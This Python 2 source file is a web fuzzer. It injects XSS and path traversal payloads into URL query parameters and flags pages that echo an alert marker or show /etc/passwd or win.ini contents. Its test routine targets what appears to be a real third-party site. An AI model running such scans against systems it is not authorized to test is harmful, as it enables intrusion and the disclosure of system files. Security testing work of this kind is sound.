#!/usr/bin/env python
from random import randint
from urllib import urlencode
from urllib import quote_plus
from urllib2 import unquote
from urlparse import urlunparse, parse_qs

from multiprocessing import TimeoutError
from multiprocessing.pool import ThreadPool

import os
import sys

cwdir = os.path.dirname(__file__)
sys.path.append(cwdir)
sys.path.append(os.path.join(cwdir, "payload_dir"))

import requests

from lxml import html

# Need to import when running on distributed
# GetPayload (2 files)
from payload_parser import GetPayload


class BaseFuzz:

    """Series of methods for another Fuzz"""

    def __init__(self):
        self.getpayload = GetPayload()
        self.xss_payloads_raw = self.getpayload.get_xss_string()
        self.trav_payloads_raw = self.getpayload.get_trav_string()
        self.timeout = 4

    def _interpret_payload(self):
        """ translate __RANDOM_INT__ to useful variable"""
        self.random_int = randint(100, 3000)
        self.xss_payloads = [
            x.replace("__RANDOM_INT__", str(self.random_int)) for x in self.xss_payloads_raw]

    def prepend_payload(self, payload_list, str_to_prepend):
        """Prepend a string for every element in list,
           append to the old list and return a new list"""
        prepended_list = []
        for payload in payload_list:
            prepend_payload = str_to_prepend + payload
            prepended_list.append(prepend_payload)

        ret_list = payload_list + prepended_list
        return ret_list

    def request_raw(self, url):
        r = requests.get(url, timeout=4)
        return r.raw

    def request_within_thread(self, url):
        """
            Set worker process for generates Thread
        """
        pool = ThreadPool(processes=2)
        async_result = pool.apply_async(self.request_raw, (url,))

        try:
            ret_val = async_result.get(timeout=7)
        except TimeoutError:
            print "Request received a hard timeout"

        return ret_val

    def urlencode_payload(self, list_to_encode):
        """Encode payload for by pass"""
        list_to_encode_copy = list(list_to_encode)
        list_encode = [quote_plus(x) for x in list_to_encode_copy]
        # ret_list = list_to_encode_copy + list_encode

        return list_encode

    def replace_string(self, payload_list, str_to_replace, replace_with):
        """ use for replace " with ' or vice versa """
        tmp_list = []
        for payload in payload_list:
            payload_replaced = payload.replace(str_to_replace, replace_with)
            if payload_replaced not in payload_list:
                tmp_list.append(payload_replaced)

        full_list = payload_list + tmp_list

        return full_list

    def set_target(self, url_parsed, query_param):
        self.url_parsed = url_parsed
        self.query_param = query_param

    def __replace_param_with_payload(self, param, payload):
        self.query_dict = parse_qs(self.url_parsed.query)
        self.query_dict[param] = payload

        assembled_query = urlencode(self.query_dict, doseq=True)
        assembled_query = unquote(assembled_query).decode('utf8')

        tmp_list = list(self.url_parsed)
        tmp_list[4] = assembled_query

        return urlunparse(tmp_list)

    def gen_url_payload(self, query_param, payloads_list):
        for payload in payloads_list:
            yield self.__replace_param_with_payload(query_param, payload)

    def url_response(self, input_url):
        """
            return url and text using for matching
        """
        url = input_url
        try:
            print "|-[+] testing url: ", url
            # r = self.request_within_thread(url)
            r = requests.get(url)
            ret_text = r.text
        except:
            ret_text = 'Request timed out'

        # return (url, ret_text)
        return ret_text

    def find_string(self, html_text, find_string):
        # tree = html.fromstring(html_text)
        flag = False
        # print 'find_string: ', find_string
        # for e in tree.xpath('//text()'):
        if find_string in html_text:
            flag = True
        # print "Flag value:", flag, "\n"
        return flag


class XSSFuzz(BaseFuzz):

    """Fuzz a single URL"""

    def __init__(self):
        BaseFuzz.__init__(self)

    def _make_xss_payloads(self):
        self._interpret_payload()
        payload_prepend = self.prepend_payload(self.xss_payloads, '">')
        payload_encoded = self.urlencode_payload(payload_prepend)
        full_list = self.replace_string(payload_encoded, '"', "'")

        self.payload_list = full_list

    def fuzz(self):
        """
            Return tuple (type Vulnerability, url with payload)
        """
        vul_list = []
        for url in self.gen_url_payload(self.query_param, self.payload_list):
            ret_text = self.url_response(url)
            matching_string = 'alert(' + str(self.random_int) + ')'
            if self.find_string(ret_text, matching_string):
                myvul = ('xss', url)
                vul_list.append(myvul)

        return vul_list


class TravFuzz(BaseFuzz):

    """Traversal Fuzzing"""

    def __init__(self):
        BaseFuzz.__init__(self)

    def _make_trav_payload(self):
        self.trav_payload = self.trav_payloads_raw
        payload_encoded = self.urlencode_payload(self.trav_payload)
        self.payload_list = payload_encoded

    def fuzz(self):
        vul_list = []
        for url in self.gen_url_payload(self.query_param, self.payload_list):
            ret_text = self.url_response(url)
            matching_strings = ['root:x', '[fonts]']
            for match_string in matching_strings:
                if self.find_string(ret_text, match_string):
                    myvul = ('trav', url)
                    vul_list.append(myvul)

        return vul_list


class MainFuzz:

    """Main class"""

    def __init__(self):
        self.xss = XSSFuzz()
        self.xss._make_xss_payloads()

        self.trav = TravFuzz()
        self.trav._make_trav_payload()

    def fuzz(self, parsed_url, query_param):
        self.trav.set_target(parsed_url, query_param)
        # self.xss.set_target(parsed_url, query_param)
        vul_list = []
        # vul_list += self.xss.fuzz()
        vul_list += self.trav.fuzz()

        return vul_list


def test():
    from urlparse import urlparse
    list_url = ["http://www.tapenade.co.uk/wp-content/themes/tapenade/js/?f=scripts&ver=4.0"]
    # for url in list_url:
    #     r = requests.get(url)
    #     print sys.getsizeof(r)
    for testurl in list_url:
        url_parsed = urlparse(testurl)
        print "[+] Domain: ", url_parsed.netloc

        query_dict = parse_qs(url_parsed.query)
        # print query_dict
        mainfuzz = MainFuzz()

        full_vul_list = []
        print query_dict
        for query_param, query_val in query_dict.iteritems():

            vul_list = mainfuzz.fuzz(url_parsed, query_param)
            full_vul_list += vul_list

        print '\n==>[+] Result is: '
        # print type(full_vul_list)
        for vul in full_vul_list:
            print 'type', vul[0], 'url: ', vul[1]


if __name__ == '__main__':
    test()
